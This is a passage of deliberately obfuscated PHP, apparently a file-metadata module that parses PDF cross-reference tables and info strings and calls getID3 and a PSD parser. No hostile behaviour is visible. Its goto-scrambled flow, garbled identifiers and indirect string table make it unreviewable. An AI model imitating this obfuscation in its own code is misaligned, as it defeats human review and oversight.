is_array($F•ğêÏĞâ) ? $F•ğêÏĞâ : array(); $F•ğêÏĞâ[$báêšÅ§Ø¿[1504]] = 0; goto EšÜ´¿ÏĞ; EšÜ´¿ÏĞ: $C¶’¡®öÑî = $báêšÅ§Ø¿[1505]; preg_match($C¶’¡®öÑî, $E±×ç–ó[$báêšÅ§Ø¿[1501]], $Féí°¨Ñç¥); if (!$F•ğêÏĞâ[$báêšÅ§Ø¿[1504]] && count($Féí°¨Ñç¥) == 5) { $F•ğêÏĞâ[$báêšÅ§Ø¿[1504]] = $Féí°¨Ñç¥[3]; $F•ğêÏĞâ[$báêšÅ§Ø¿[1506]] = $Féí°¨Ñç¥[4]; } goto eôÚ¨£ìŞ; Fó¨ÇŒ¥†­: } private static function parseInfoItem($EÑø‚æ®†Æ) { $c–ÀØß¡¯ =& $_SERVER[Ìó]; if (!$EÑø‚æ®†Æ) { return !1; } $Dóà©ÉíÏè = array($c–ÀØß¡¯[1317] => array($c–ÀØß¡¯[1510], $c–ÀØß¡¯[33]), $c–ÀØß¡¯[1511] => array($c–ÀØß¡¯[1512], $c–ÀØß¡¯[33]), $c–ÀØß¡¯[183] => array($c–ÀØß¡¯[1513], $c–ÀØß¡¯[206]), $c–ÀØß¡¯[106] => array($c–ÀØß¡¯[1514], $c–ÀØß¡¯[206]), $c–ÀØß¡¯[1508] => array($c–ÀØß¡¯[1508], $c–ÀØß¡¯[272]), $c–ÀØß¡¯[1504] => array($c–ÀØß¡¯[1504], $c–ÀØß¡¯[272]), $c–ÀØß¡¯[1506] => array($c–ÀØß¡¯[1506], $c–ÀØß¡¯[272]), $c–ÀØß¡¯[1515] => array($c–ÀØß¡¯[1516], $c–ÀØß¡¯[33]), $c–ÀØß¡¯[1517] => array($c–ÀØß¡¯[1518], $c–ÀØß¡¯[33]), $c–ÀØß¡¯[1519] => array($c–ÀØß¡¯[1316], $c–ÀØß¡¯[33])); $AØõĞˆ²Ò = array(); foreach ($Dóà©ÉíÏè as $b¥¬ãÉÈÑ½ => $cŠ„´†Ó‡’) { if (!isset($EÑø‚æ®†Æ[$cŠ„´†Ó‡’[0]])) { continue; } $B„ò½íÚ¡§ = $EÑø‚æ®†Æ[$cŠ„´†Ó‡’[0]]; if (!$B„ò½íÚ¡§ || is_array($B„ò½íÚ¡§)) { continue; } switch ($cŠ„´†Ó‡’[1]) { case $c–ÀØß¡¯[272]: $B„ò½íÚ¡§ = intval($B„ò½íÚ¡§); break; case $c–ÀØß¡¯[206]: if (substr($B„ò½íÚ¡§, 0, 2) == $c–ÀØß¡¯[1520]) { $B„ò½íÚ¡§ = substr($B„ò½íÚ¡§, 2, 14); } if (strtotime($B„ò½íÚ¡§)) { $B„ò½íÚ¡§ = date($c–ÀØß¡¯[1521], strtotime($B„ò½íÚ¡§)); } break; } $AØõĞˆ²Ò[$b¥¬ãÉÈÑ½] = $B„ò½íÚ¡§; } return $AØõĞˆ²Ò; } private static function decodeXref(&$FÑ²É†®ØÔ) { goto C’Ç‡Öë; eìÂ‹¾¼Œ: if ($FÑ²É†®ØÔ[$Cì£¦…ß—[77]] - $E›²¡¤¬ñó > $FÑ²É†®ØÔ[$Cì£¦…ß—[1500]]) { $C›íµ­¤Š = 4 * $FÑ²É†®ØÔ[$Cì£¦…ß—[1500]]; $FÑ²É†®ØÔ[$Cì£¦…ß—[1500]] = $C›íµ­¤Š; $FÑ²É†®ØÔ[$Cì£¦…ß—[1501]] = StreamWrapperIO::read($FÑ²É†®ØÔ[$Cì£¦…ß—[75]], 0, $C›íµ­¤Š); $FÑ²É†®ØÔ[$Cì£¦…ß—[1502]] = StreamWrapperIO::read($FÑ²É†®ØÔ[$Cì£¦…ß—[75]], $FÑ²É†®ØÔ[$Cì£¦…ß—[77]] - $C›íµ­¤Š, $C›íµ­¤Š); $b‘µ¡¼‡Ø° = $FÑ²É†®ØÔ[$Cì£¦…ß—[1502]]; } $cÖæÓ¢¯ô = 0; preg_match_all($Cì£¦…ß—[1524], $b‘µ¡¼‡Ø°, $C˜®Ùğä†ê); goto eÑñöøàÛã; Cçä”Ş¥ÌŠ: if (preg_match($Cì£¦…ß—[1529], $aäÃ ˆø¥ˆ, $C˜®Ùğä†ê) > 0) { $cĞ‚Ã¬¯˜Ô[$Cì£¦…ß—[1503]][$Cì£¦…ß—[77]] = intval($C˜®Ùğä†ê[1]); } if (preg_match($Cì£¦…ß—[1530], $aäÃ ˆø¥ˆ, $C˜®Ùğä†ê) > 0) { $cĞ‚Ã¬¯˜Ô[$Cì£¦…ß—[1503]][$Cì£¦…ß—[1531]] = intval($C˜®Ùğä†ê[1]) . $Cì£¦…ß—[70] . intval($C˜®Ùğä†ê[2]); } if (preg_match($Cì£¦…ß—[1532], $aäÃ ˆø¥ˆ, $C˜®Ùğä†ê) > 0) { $cĞ‚Ã¬¯˜Ô[$Cì£¦…ß—[1503]][$Cì£¦…ß—[1533]] = intval($C˜®Ùğä†ê[1]) . $Cì£¦…ß—[70] . intval($C˜®Ùğä†ê[2]); } goto aˆ§ä“õ‡; a¢‡±ßêÕä: $DÓÔ“»Å’ = $Cì£¦…ß—[1523]; if (!preg_match_all($DÓÔ“»Å’, $b‘µ¡¼‡Ø°, $C˜®Ùğä†ê, PREG_SET_ORDER, 0)) { return !1; } $E›²¡¤¬ñó = intval($C˜®Ùğä†ê[0][1]); goto eìÂ‹¾¼Œ; eÑñöøàÛã: foreach ($C˜®Ùğä†ê[3] as $dàâ¹ÚŒØÎ => $EÈæÁ”Åç‚) { if ($C˜®Ùğä†ê[3][$dàâ¹ÚŒØÎ] == $Cì£¦…ß—[1525]) { $CÏº˜»ö¢‚ = $cÖæÓ¢¯ô . $Cì£¦…ß—[70] . intval($C˜®Ùğä†ê[2][$dàâ¹ÚŒØÎ]); $cĞ‚Ã¬¯˜Ô[$Cì£¦…ß—[1522]][$CÏº˜»ö¢‚] = intval($C˜®Ùğä†ê[1][$dàâ¹ÚŒØÎ]); ++$cÖæÓ¢¯ô; } else { if ($C˜®Ùğä†ê[3][$dàâ¹ÚŒØÎ] == $Cì£¦…ß—[1526]) { ++$cÖæÓ¢¯ô; } else { } } } if (preg_match_all($Cì£¦…ß—[1527], $b‘µ¡¼‡Ø°, $C˜®Ùğä†ê)) { $aâõ®Ûï†¦ = $FÑ²É†®ØÔ[$Cì£¦…ß—[77]] - $FÑ²É†®ØÔ[$Cì£¦…ß—[1500]]; foreach ($C˜®Ùğä†ê[0] as $dàâ¹ÚŒØÎ => $aÚ·¿ŸÓŸ˜) { $FìöÌÑ¥Î‘ = $C˜®Ùğä†ê[1][$dàâ¹ÚŒØÎ] . $Cì£¦…ß—[70] . $C˜®Ùğä†ê[2][$dàâ¹ÚŒØÎ]; $cĞ‚Ã¬¯˜Ô[$Cì£¦…ß—[1522]][$FìöÌÑ¥Î‘] = strpos($b‘µ¡¼‡Ø°, $aÚ·¿ŸÓŸ˜) + $aâõ®Ûï†¦ + 1; } } if (preg_match_all($Cì£¦…ß—[1528], $b‘µ¡¼‡Ø°, $C˜®Ùğä†ê)) { $aäÃ ˆø¥ˆ = count($C˜®Ùğä†ê[1]) == 1 ? $C˜®Ùğä†ê[1][0] : $C˜®Ùğä†ê[1][1]; } else { $aäÃ ˆø¥ˆ = substr($b‘µ¡¼‡Ø°, -1024 * 5); } goto Cçä”Ş¥ÌŠ; C’Ç‡Öë: $Cì£¦…ß— =& $_SERVER[Ìó]; $b‘µ¡¼‡Ø° = $FÑ²É†®ØÔ[$Cì£¦…ß—[1502]]; $cĞ‚Ã¬¯˜Ô = array($Cì£¦…ß—[1503] => array(), $Cì£¦…ß—[1522] => array()); goto a¢‡±ßêÕä; aˆ§ä“õ‡: if (preg_match($Cì£¦…ß—[1534], $aäÃ ˆø¥ˆ, $C˜®Ùğä†ê) > 0) { $cĞ‚Ã¬¯˜Ô[$Cì£¦…ß—[1503]][$Cì£¦…ß—[1180]] = intval($C˜®Ùğä†ê[1]) . $Cì£¦…ß—[70] . intval($C˜®Ùğä†ê[2]); } if (preg_match($Cì£¦…ß—[1535], $aäÃ ˆø¥ˆ, $C˜®Ùğä†ê) > 0) { $cĞ‚Ã¬¯˜Ô[$Cì£¦…ß—[1503]][$Cì£¦…ß—[363]] = array(); $cĞ‚Ã¬¯˜Ô[$Cì£¦…ß—[1503]][$Cì£¦…ß—[363]][0] = $C˜®Ùğä†ê[1]; $cĞ‚Ã¬¯˜Ô[$Cì£¦…ß—[1503]][$Cì£¦…ß—[363]][1] = $C˜®Ùğä†ê[2]; } if (!$cĞ‚Ã¬¯˜Ô[$Cì£¦…ß—[1503]][$Cì£¦…ß—[1180]]) { return !1; } goto a­ˆÏÜ Õ°; a­ˆÏÜ Õ°: if (preg_match($Cì£¦…ß—[1536], $aäÃ ˆø¥ˆ, $C˜®Ùğä†ê) > 0) { } return $cĞ‚Ã¬¯˜Ô; goto d½ÜØñÀ´; d½ÜØñÀ´: } private static function getObjectValue($CÑ¤Æ™é·—, $fì¨ÇĞÁ³, $A²ˆæâ‡Ş) { goto bÌãµ†Ë¾ô; bÌãµ†Ë¾ô: $f¿Ü·İĞ¹£ =& $_SERVER[Ìó]; $aéºìèò§ë = self::getObject($CÑ¤Æ™é·—, $fì¨ÇĞÁ³[$f¿Ü·İĞ¹£[1522]][$A²ˆæâ‡Ş]); if (is_string($aéºìèò§ë[1])) { return $aéºìèò§ë[1]; } goto fÆå¨†Èƒó; CâèæƒØÃ: return $EŞÔË›é”ø; goto CÕŒƒÕÆ÷š; fÆå¨†Èƒó: if (!is_array($aéºìèò§ë[1])) { return array(); } $EŞÔË›é”ø = array(); for ($fæêò»æà = 0; $fæêò»æà < count($aéºìèò§ë[1]); $fæêò»æà += 2) { $eãÉ•¶…§Á = $aéºìèò§ë[1][$fæêò»æà]; $A‡Ãà¸‘‰å = $aéºìèò§ë[1][$fæêò»æà + 1]; if (count($eãÉ•¶…§Á) == 3 && $eãÉ•¶…§Á[0] == $f¿Ü·İĞ¹£[8]) { $cï²óÕŸ = !1; if ($A‡Ãà¸‘‰å[0] == $f¿Ü·İĞ¹£[1537]) { $A‡Ãà¸‘‰å = self::getObject($CÑ¤Æ™é·—, $fì¨ÇĞÁ³[$f¿Ü·İĞ¹£[1522]][$A‡Ãà¸‘‰å[1]]); } $cï²óÕŸ = $A‡Ãà¸‘‰å[1]; if ($cï²óÕŸ === !1) { continue; } if (is_string($cï²óÕŸ)) { $cï²óÕŸ = self::decodeStr($cï²óÕŸ); } $EŞÔË›é”ø[$eãÉ•¶…§Á[1]] = $cï²óÕŸ; } } goto CâèæƒØÃ; CÕŒƒÕÆ÷š: } private static function getObject($A£‚–ºŠ, $Eâ¬ôÔñ¡Á) { $c¤çà«¡ø· = self::getObjectItem($A£‚–ºŠ, $Eâ¬ôÔñ¡Á); $c¤çà«¡ø· = self::getObjectItem($A£‚–ºŠ, $c¤çà«¡ø·[2]); return $c¤çà«¡ø·; } private static function getObjectItem($D‰àâò¿ã, $aÌê­‹¦í„) { goto bœŠŸŠ‘˜ë; dÑÌîà¨: $a”‹Ÿ“À·ö = $aÌê­‹¦í„ >= $A©¬…“¢ùá ? $aÌê­‹¦í„ - $A©¬…“¢ùá : $aÌê­‹¦í„; $eöí‹áè¤à = $aÌê­‹¦í„ >= $A©¬…“¢ùá ? $D‰àâò¿ã[$c§³½Ì ÁÎ[1502]] : $D‰àâò¿ã[$c§³½Ì ÁÎ[1501]]; if ($aÌê­‹¦í„ > $B½Ší÷áÅå && $aÌê­‹¦í„ <= $A©¬…“¢ùá) { $a”‹Ÿ“À·ö = 0; $eöí‹áè¤à = StreamWrapperIO::read($D‰àâò¿ã[$c§³½Ì ÁÎ[75]], $aÌê­‹¦í„, $B½Ší÷áÅå); } goto FèÖÄÉ”ÉŸ; FèÖÄÉ”ÉŸ: $Eƒ¡×Ë®¼¢ = self::getRawObject($eöí‹áè¤à, $a”‹Ÿ“À·ö); if ($aÌê­‹¦í„ >= $A©¬…“¢ùá) { $Eƒ¡×Ë®¼¢[2] = $Eƒ¡×Ë®¼¢[2] + $A©¬…“¢ùá; } else { if ($aÌê­‹¦í„ > $B½Ší÷áÅå && $aÌê­‹¦í„ <= $A©¬…“¢ùá) { $Eƒ¡×Ë®¼¢[2] = $Eƒ¡×Ë®¼¢[2] + $aÌê­‹¦í„; } } return $Eƒ¡×Ë®¼¢; goto f«êéà§; bœŠŸŠ‘˜ë: $c§³½Ì ÁÎ =& $_SERVER[Ìó]; $B½Ší÷áÅå = $D‰àâò¿ã[$c§³½Ì ÁÎ[1500]]; $A©¬…“¢ùá = $D‰àâò¿ã[$c§³½Ì ÁÎ[77]] - $B½Ší÷áÅå; goto dÑÌîà¨; f«êéà§: } private static function decodeStr($Eâ°‚¢Å¨) { goto b«¼´™î˜½; dƒ‹æö‚ïÎ: $Eâ°‚¢Å¨ = $CÃâéÈ»œ[33]; foreach ($cšÔö¨Çõ as $bƒŞÏ—‰”Â) { if (preg_match($CÃâéÈ»œ[1549], $bƒŞÏ—‰”Â)) { $Eâ°‚¢Å¨ .= \chr(hexdec(trim($bƒŞÏ—‰”Â, $CÃâéÈ»œ[1550]))); } else { $Eâ°‚¢Å¨ .= $bƒŞÏ—‰”Â; } } $cšÔö¨Çõ = preg_split($CÃâéÈ»œ[1551], $Eâ°‚¢Å¨, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto F…ÎÒ”‰‰; bÂŒ­¸‡ø÷: return $Eâ°‚¢Å¨; goto cš§Éª…¥ù; F…ÎÒ”‰‰: $Eâ°‚¢Å¨ = $CÃâéÈ»œ[33]; foreach ($cšÔö¨Çõ as $bƒŞÏ—‰”Â) { if (preg_match($CÃâéÈ»œ[1552], $bƒŞÏ—‰”Â) && !1 === stripos($bƒŞÏ—‰”Â, $CÃâéÈ»œ[1553])) { $bƒŞÏ—‰”Â = preg_replace($CÃâéÈ»œ[1554], $CÃâéÈ»œ[33], $bƒŞÏ—‰”Â); $bƒŞÏ—‰”Â = trim($bƒŞÏ—‰”Â, $CÃâéÈ»œ[924]); $bƒŞÏ—‰”Â = pack($CÃâéÈ»œ[1555], $bƒŞÏ—‰”Â); $Eâ°‚¢Å¨ .= $bƒŞÏ—‰”Â; } else { $Eâ°‚¢Å¨ .= $bƒŞÏ—‰”Â; } } if (preg_match($CÃâéÈ»œ[1556], $Eâ°‚¢Å¨)) { $f¬ÎÄ»»å = substr($Eâ°‚¢Å¨, 2); $Eâ°‚¢Å¨ = $CÃâéÈ»œ[33]; $aÕæñî†…² = strlen($f¬ÎÄ»»å); for ($a¼ÙŠÓØ²² = 0; $a¼ÙŠÓØ²² < $aÕæñî†…²; $a¼ÙŠÓØ²² += 2) { $cå—°Äİ¶ = hexdec(bin2hex(substr($f¬ÎÄ»»å, $a¼ÙŠÓØ²², 2))); $Eâ°‚¢Å¨ .= mb_convert_encoding($CÃâéÈ»œ[1557] . intval($cå—°Äİ¶) . $CÃâéÈ»œ[67], $CÃâéÈ»œ[1558], $CÃâéÈ»œ[1559]); } } goto bÂŒ­¸‡ø÷; b«¼´™î˜½: $CÃâéÈ»œ =& $_SERVER[Ìó]; $Eâ°‚¢Å¨ = str_replace(array($CÃâéÈ»œ[1538], $CÃâéÈ»œ[1539], $CÃâéÈ»œ[1540], $CÃâéÈ»œ[1541], $CÃâéÈ»œ[1542], $CÃâéÈ»œ[1543], $CÃâéÈ»œ[1544], $CÃâéÈ»œ[1545]), array($CÃâéÈ»œ[93], $CÃâéÈ»œ[50], $CÃâéÈ»œ[8], $CÃâéÈ»œ[244], $CÃâéÈ»œ[815], $CÃâéÈ»œ[213], $CÃâéÈ»œ[988], $CÃâéÈ»œ[326]), $Eâ°‚¢Å¨); $cšÔö¨Çõ = preg_split($CÃâéÈ»œ[1546], $Eâ°‚¢Å¨, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto A«˜ÈÇ¥Úğ; A«˜ÈÇ¥Úğ: $Eâ°‚¢Å¨ = $CÃâéÈ»œ[33]; foreach ($cšÔö¨Çõ as $bƒŞÏ—‰”Â) { if (preg_match($CÃâéÈ»œ[1547], $bƒŞÏ—‰”Â)) { $Eâ°‚¢Å¨ .= \chr(octdec(trim($bƒŞÏ—‰”Â, $CÃâéÈ»œ[93]))); } else { $Eâ°‚¢Å¨ .= $bƒŞÏ—‰”Â; } } $cšÔö¨Çõ = preg_split($CÃâéÈ»œ[1548], $Eâ°‚¢Å¨, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto dƒ‹æö‚ïÎ; cš§Éª…¥ù: } private static function getRawObject($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ = 0) { goto Cî†é¢Ñ—º; E‡ÏÅ»›„: return array($F¾ƒœ¨»Ö‚, $EïŒ á¨Ç, $b¨ÙÊ÷£ğÎ); goto Bƒ”íê¶à ; Cî†é¢Ñ—º: $aë×È•—ô§ =& $_SERVER[Ìó]; $F¾ƒœ¨»Ö‚ = $aë×È•—ô§[33]; $EïŒ á¨Ç = $aë×È•—ô§[33]; goto F¥Ú÷­‚Šˆ; F¥Ú÷­‚Šˆ: $b¨ÙÊ÷£ğÎ += strspn($a’»ââ™Ç§, $aë×È•—ô§[1560], $b¨ÙÊ÷£ğÎ); $DĞøğ’ñ¤ì = $a’»ââ™Ç§[$b¨ÙÊ÷£ğÎ]; switch ($DĞøğ’ñ¤ì) { case $aë×È•—ô§[1561]: $CÁñ±ªĞ›ğ = strcspn($a’»ââ™Ç§, $aë×È•—ô§[1562], $b¨ÙÊ÷£ğÎ); if ($CÁñ±ªĞ›ğ > 0) { $b¨ÙÊ÷£ğÎ += $CÁñ±ªĞ›ğ; return self::getRawObject($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ); } break; case $aë×È•—ô§[8]: $F¾ƒœ¨»Ö‚ = $DĞøğ’ñ¤ì; ++$b¨ÙÊ÷£ğÎ; $B»‰¢‹¢„ = preg_match($aë×È•—ô§[1563], substr($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ, 256), $DëºéÌ¨æ—); if (1 == $B»‰¢‹¢„) { $EïŒ á¨Ç = $DëºéÌ¨æ—[1]; $b¨ÙÊ÷£ğÎ += strlen($EïŒ á¨Ç); } break; case $aë×È•—ô§[244]: case $aë×È•—ô§[815]: $F¾ƒœ¨»Ö‚ = $DĞøğ’ñ¤ì; ++$b¨ÙÊ÷£ğÎ; $D‘‰—ÊË‰ö = $b¨ÙÊ÷£ğÎ; if ($aë×È•—ô§[244] == $DĞøğ’ñ¤ì) { $dÄÊÄ¡Ââ = 1; while ($dÄÊÄ¡Ââ > 0) { if (!isset($a’»ââ™Ç§[$D‘‰—ÊË‰ö])) { break; } $D¥÷ÍíÀôÀ = $a’»ââ™Ç§[$D‘‰—ÊË‰ö]; switch ($D¥÷ÍíÀôÀ) { case $aë×È•—ô§[93]: ++$D‘‰—ÊË‰ö; break; case $aë×È•—ô§[244]: ++$dÄÊÄ¡Ââ; break; case $aë×È•—ô§[815]: --$dÄÊÄ¡Ââ; break; } ++$D‘‰—ÊË‰ö; } $EïŒ á¨Ç = substr($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ, $D‘‰—ÊË‰ö - $b¨ÙÊ÷£ğÎ - 1); $b¨ÙÊ÷£ğÎ = $D‘‰—ÊË‰ö; } break; case $aë×È•—ô§[153]: case $aë×È•—ô§[471]: $F¾ƒœ¨»Ö‚ = $DĞøğ’ñ¤ì; ++$b¨ÙÊ÷£ğÎ; if ($aë×È•—ô§[153] == $DĞøğ’ñ¤ì) { $EïŒ á¨Ç = array(); do { $EÄ­™®ƒ¬ = $b¨ÙÊ÷£ğÎ; $CãÀ…’Ãå» = self::getRawObject($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ); $b¨ÙÊ÷£ğÎ = $CãÀ…’Ãå»[2]; $EïŒ á¨Ç[] = $CãÀ…’Ãå»; } while ($aë×È•—ô§[471] != $CãÀ…’Ãå»[0] && $b¨ÙÊ÷£ğÎ != $EÄ­™®ƒ¬); array_pop($EïŒ á¨Ç); } break; case $aë×È•—ô§[923]: case $aë×È•—ô§[926]: if (isset($a’»ââ™Ç§[$b¨ÙÊ÷£ğÎ + 1]) && $a’»ââ™Ç§[$b¨ÙÊ÷£ğÎ + 1] == $DĞøğ’ñ¤ì) { $F¾ƒœ¨»Ö‚ = $DĞøğ’ñ¤ì . $DĞøğ’ñ¤ì; $b¨ÙÊ÷£ğÎ += 2; if ($aë×È•—ô§[923] == $DĞøğ’ñ¤ì) { $EïŒ á¨Ç = array(); do { $EÄ­™®ƒ¬ = $b¨ÙÊ÷£ğÎ; $CãÀ…’Ãå» = self::getRawObject($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ); $b¨ÙÊ÷£ğÎ = $CãÀ…’Ãå»[2]; $EïŒ á¨Ç[] = $CãÀ…’Ãå»; } while ($aë×È•—ô§[1564] != $CãÀ…’Ãå»[0] && $b¨ÙÊ÷£ğÎ != $EÄ­™®ƒ¬); array_pop($EïŒ á¨Ç); } } else { $F¾ƒœ¨»Ö‚ = $DĞøğ’ñ¤ì; ++$b¨ÙÊ÷£ğÎ; $B»‰¢‹¢„ = preg_match($aë×È•—ô§[1565], substr($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ), $DëºéÌ¨æ—); if ($aë×È•—ô§[923] == $DĞøğ’ñ¤ì && 1 == $B»‰¢‹¢„) { $EïŒ á¨Ç = strtr($DëºéÌ¨æ—[1], $aë×È•—ô§[1566], $aë×È•—ô§[33]); $b¨ÙÊ÷£ğÎ += \strlen($DëºéÌ¨æ—[0]); } elseif (!1 !== ($DÎº†÷Ù• = strpos($a’»ââ™Ç§, $aë×È•—ô§[926], $b¨ÙÊ÷£ğÎ))) { $b¨ÙÊ÷£ğÎ = $DÎº†÷Ù• + 1; } } break; default: if ($aë×È•—ô§[1567] == substr($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ, 6)) { $F¾ƒœ¨»Ö‚ = $aë×È•—ô§[1567]; $b¨ÙÊ÷£ğÎ += 6; } elseif ($aë×È•—ô§[99] == substr($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ, 4)) { $F¾ƒœ¨»Ö‚ = $aë×È•—ô§[99]; $b¨ÙÊ÷£ğÎ += 4; $EïŒ á¨Ç = $aë×È•—ô§[99]; } elseif ($aë×È•—ô§[1568] == substr($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ, 4)) { $F¾ƒœ¨»Ö‚ = $aë×È•—ô§[1569]; $b¨ÙÊ÷£ğÎ += 4; $EïŒ á¨Ç = $aë×È•—ô§[1568]; } elseif ($aë×È•—ô§[1570] == substr($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ, 5)) { $F¾ƒœ¨»Ö‚ = $aë×È•—ô§[1569]; $b¨ÙÊ÷£ğÎ += 5; $EïŒ á¨Ç = $aë×È•—ô§[1570]; } elseif ($aë×È•—ô§[1571] == substr($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ, 6)) { $F¾ƒœ¨»Ö‚ = $aë×È•—ô§[1571]; $b¨ÙÊ÷£ğÎ += 6; if (1 == preg_match($aë×È•—ô§[1572], substr($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ), $DëºéÌ¨æ—)) { $b¨ÙÊ÷£ğÎ += strlen($DëºéÌ¨æ—[0]); $DàæÔì÷ù = $aë×È•—ô§[1573]; $B»‰¢‹¢„ = preg_match($DàæÔì÷ù, substr($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ), $DëºéÌ¨æ—, PREG_OFFSET_CAPTURE); if (1 == $B»‰¢‹¢„) { $EïŒ á¨Ç = substr($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ, $DëºéÌ¨æ—[0][1]); $b¨ÙÊ÷£ğÎ += $DëºéÌ¨æ—[1][1]; } } } elseif ($aë×È•—ô§[1574] == substr($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ, 9)) { $F¾ƒœ¨»Ö‚ = $aë×È•—ô§[1574]; $b¨ÙÊ÷£ğÎ += 9; } elseif (1 == preg_match($aë×È•—ô§[1575], substr($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ, 33), $DëºéÌ¨æ—)) { $F¾ƒœ¨»Ö‚ = $aë×È•—ô§[1537]; $b¨ÙÊ÷£ğÎ += strlen($DëºéÌ¨æ—[0]); $EïŒ á¨Ç = intval($DëºéÌ¨æ—[1]) . $aë×È•—ô§[70] . intval($DëºéÌ¨æ—[2]); } elseif (1 == preg_match($aë×È•—ô§[1576], substr($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ, 33), $DëºéÌ¨æ—)) { $F¾ƒœ¨»Ö‚ = $aë×È•—ô§[1577]; $EïŒ á¨Ç = intval($DëºéÌ¨æ—[1]) . $aë×È•—ô§[70] . intval($DëºéÌ¨æ—[2]); $b¨ÙÊ÷£ğÎ += strlen($DëºéÌ¨æ—[0]); } elseif (($FÀ¢ñäïÒ± = strspn($a’»ââ™Ç§, $aë×È•—ô§[1578], $b¨ÙÊ÷£ğÎ)) > 0) { $F¾ƒœ¨»Ö‚ = $aë×È•—ô§[1579]; $EïŒ á¨Ç = substr($a’»ââ™Ç§, $b¨ÙÊ÷£ğÎ, $FÀ¢ñäïÒ±); $b¨ÙÊ÷£ğÎ += $FÀ¢ñäïÒ±; } break; } goto E‡ÏÅ»›„; Bƒ”íê¶à : } } class GetInfo { private static $fileTypeArray; public static function get($DÇ××”Ç) { $cÕÓ°³£ˆö = IO::info($DÇ××”Ç); return self::infoAdd($cÕÓ°³£ˆö); } public static function infoAdd(&$bœÊØË‚œ) { goto C–À„‰­¢é; C–À„‰­¢é: $AÂµ§Ä˜ã‘ =& $_SERVER[Ìó]; static $f®¥Ç§™•; if (!$f®¥Ç§™•) { require SDK_DIR . $AÂµ§Ä˜ã‘[1580]; $f®¥Ç§™• = new getID3(); } goto F•ŞõÌÄ˜ñ; CŠÓä„…¿: $bÜ‘á‹«Œ[$AÂµ§Ä˜ã‘[368]] = $Bø¢’ÔÅçí; $bœÊØË‚œ[$AÂµ§Ä˜ã‘[421]] = $bÜ‘á‹«Œ; return $bœÊØË‚œ; goto Bó®òğé†É; c§¤ªº½„ê: $Bø¢’ÔÅçí = $bœÊØË‚œ[$AÂµ§Ä˜ã‘[156]]; try { if ($bœÊØË‚œ[$AÂµ§Ä˜ã‘[156]] == $AÂµ§Ä˜ã‘[1582]) { $bÜ‘á‹«Œ = self::psdParse($c”·ñÌˆ¢Ä); $Bø¢’ÔÅçí = $AÂµ§Ä˜ã‘[1583]; } else { if ($bœÊØË‚œ[$AÂµ§Ä˜ã‘[156]] == $AÂµ§Ä˜ã‘[1584]) { $bÜ‘á‹«Œ = self::pdfParse($c”·ñÌˆ¢Ä); } else { $Bø¢’ÔÅçí = self::$fileTypeArray[$AÂµ§Ä˜ã‘[1585]][$bœÊØË‚œ[$AÂµ§Ä˜ã‘[156]]]; $AÜ»”ºöçâ = self::$fileTypeArray[$AÂµ§Ä˜ã‘[1586]][$Bø¢’ÔÅçí][$AÂµ§Ä˜ã‘[1587]]; $F‚¨šÚá² = @$f®¥Ç§™•->analyze($c”·ñÌˆ¢Ä, $bœÊØË‚œ[$AÂµ§Ä˜ã‘[77]], $bœÊØË‚œ[$AÂµ§Ä˜ã‘[28]]); $bÜ‘á‹«Œ = self::parseData($F‚¨šÚá², $AÜ»”ºöçâ, $bœÊØË‚œ); } } } catch (Exception $Eª÷Œ­Á¢ì) { $bÜ‘á‹«Œ = array($AÂµ§Ä˜ã‘[368] => $Bø¢’ÔÅçí); } if (!$bÜ‘á‹«Œ) { return; } goto CŠÓä„…¿; F•ŞõÌÄ˜ñ: if (!$bœÊØË‚œ || $bœÊØË‚œ[$AÂµ§Ä˜ã‘[29]] != $AÂµ§Ä˜ã‘[163]) { return; } if (!self::support($bœÊØË‚œ[$AÂµ§Ä˜ã‘[156]]) || isset($bœÊØË‚œ[$AÂµ§Ä˜ã‘[421]])) { return; } $c”·ñÌˆ¢Ä = $AÂµ§Ä˜ã‘[1581] . $bœÊØË‚œ[$AÂµ§Ä˜ã‘[75]]; goto c§¤ªº½„ê; Bó®òğé†É: } public static function support($BŞè…£‘’¤) { goto DÜîÖ¥èî; DØº¯©‡ˆÂ: return !1; goto E‹‘Ğ†î—; A×êÊå¿§: $Eå½»”ŸÏ³ = array($a‹šé‘ŠÆ×[1584], $a‹šé‘ŠÆ×[1582]); if (in_array($BŞè…£‘’¤, $Eå½»”ŸÏ³)) { return !0; } if (isset(self::$fileTypeArray[$a‹šé‘ŠÆ×[1585]][$BŞè…£‘’¤])) { return !0; } goto DØº¯©‡ˆÂ; DÜîÖ¥èî: $a‹šé‘ŠÆ× =& $_SERVER[Ìó]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $BŞè…£‘’¤ = strtolower($BŞè…£‘’¤); goto A×êÊå¿§; E‹‘Ğ†î—: } private static function parseData($Eù¦ŠÃÇŒà, $DÄ«ŒÍ‰Ù½, $fÌíØ£í‚é) { $EØçå¶ÑÛÏ =& $_SERVER[Ìó]; $D‚œ±„ë÷ó = $Eù¦ŠÃÇŒà[$EØçå¶ÑÛÏ[1588]]; $Aˆ¥áíã = array(); foreach ($DÄ«ŒÍ‰Ù½ as $bİ¿²àî” => $fÅ¸ÓÖãõ) { foreach ($fÅ¸ÓÖãõ as $f‘¹©Ò¼•¬) { if (is_array($f‘¹©Ò¼•¬)) { $EŞĞÕ‡›— = self::parseData($Eù¦ŠÃÇŒà, $fÅ¸ÓÖãõ, $fÌíØ£í‚é); if ($EŞĞÕ‡›—) { 